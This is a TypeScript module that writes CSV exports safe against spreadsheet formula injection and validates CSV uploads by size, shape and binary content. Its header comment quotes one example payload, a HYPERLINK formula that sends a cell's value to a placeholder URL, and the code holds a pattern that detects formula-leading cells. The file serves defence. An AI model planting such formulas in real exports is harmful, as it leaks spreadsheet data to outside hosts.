// CSV writing that is safe to open in Excel, Numbers or Google Sheets.
//
// Exported cells carry text from uploaded files (client names, ticket
// subjects, contract excerpts). A cell that starts with =, +, -, @, a tab or
// a carriage return is read as a formula by spreadsheet apps, so a ticket
// subject like =HYPERLINK("http://x/?"&A1,"click") would run when the MSP
// opens the export. Such cells get a leading apostrophe (OWASP's advice), which
// spreadsheets show as plain text. Real numbers are left alone so they stay
// numbers, including negatives.
//
// Quoting follows RFC 4180: a field is quoted when it contains a comma, a
// double quote, CR or LF, and quotes inside are doubled. Rows end with LF,
// which every spreadsheet app reads.

const FORMULA_START = /^[=+\-@\t\r]/
// A plain number written as text ("-12", "+3.5", "1,234.00") can't be a
// formula, so it isn't prefixed.
const PLAIN_NUMBER = /^[-+]?(\d{1,3}(,\d{3})+|\d+)(\.\d+)?$/

export function csvCell(v: unknown): string {
  if (v == null) return ''
  if (typeof v === 'number') return Number.isFinite(v) ? String(v) : ''
  if (typeof v === 'boolean') return v ? 'true' : 'false'
  let s = v instanceof Date ? v.toISOString() : String(v)
  if (FORMULA_START.test(s) && !PLAIN_NUMBER.test(s)) s = `'${s}`
  return /[",\r\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s
}

// Rows of objects to CSV; the first row's keys are the header. Header names
// go through the same escaping.
export function toSafeCsv(rows: Record<string, unknown>[]): string {
  if (!rows.length) return ''
  const headers = Object.keys(rows[0])
  return [headers.map(csvCell).join(','), ...rows.map((r) => headers.map((h) => csvCell(r[h])).join(','))].join('\n')
}

// ---------------------------------------------------------------- upload limits

// Limits for CSV imports, in one place, for the import screen to apply before
// and after parsing (checkCsvFile, checkCsvShape). Hosted mode also limits
// what the database accepts per row (migration 20261008000100).
export const CSV_MAX_BYTES = 25 * 1024 * 1024
export const CSV_MAX_ROWS = 100_000
export const CSV_MAX_COLUMNS = 200
// Local (browser) mode runs out of storage long before a server would.
export const CSV_LOCAL_ROW_LIMIT = 6000

// The first problem with a CSV file the user picked, or null. Pure apart from
// reading the first KB, so the same rules apply everywhere it's called.
export async function checkCsvFile(f: File): Promise<string | null> {
  if (/\.xlsx?$/i.test(f.name)) return "Excel files aren't supported yet. In Excel choose File › Save As › CSV (UTF-8), then upload that file."
  if (!/\.(csv|txt)$/i.test(f.name) && f.type !== 'text/csv') return "This doesn't look like a CSV export. Export the report as CSV from your PSA and try again."
  if (f.size === 0) return 'This file is empty.'
  if (f.size > CSV_MAX_BYTES) return 'This file is over 25 MB. Split it into smaller exports.'
  if (looksBinary(new Uint8Array(await f.slice(0, 1024).arrayBuffer()))) return "This doesn't look like a CSV export. Export the report as CSV from your PSA and try again."
  return null
}

// The first problem with the parsed rows, or null.
export function checkCsvShape(headers: string[], rowCount: number): string | null {
  if (headers.length > CSV_MAX_COLUMNS) return `This file has ${headers.length} columns. Export only the columns Headroom needs (at most ${CSV_MAX_COLUMNS}).`
  if (rowCount > CSV_MAX_ROWS) return `This file has more than ${CSV_MAX_ROWS.toLocaleString('en-GB')} rows. Export a shorter date range.`
  return null
}

// A CSV is text. A NUL byte, or more than one byte in ten that isn't printable
// (tabs and line breaks aside), means a spreadsheet, PDF or other binary file.
// Bytes from 0x80 up are UTF-8 (a £ sign, say), so they count as text.
export function looksBinary(head: Uint8Array): boolean {
  if (!head.length) return false
  let odd = 0
  for (const b of head) {
    if (b === 0) return true
    if ((b < 0x20 && b !== 0x09 && b !== 0x0a && b !== 0x0d) || b === 0x7f) odd++
  }
  return odd / head.length > 0.1
}
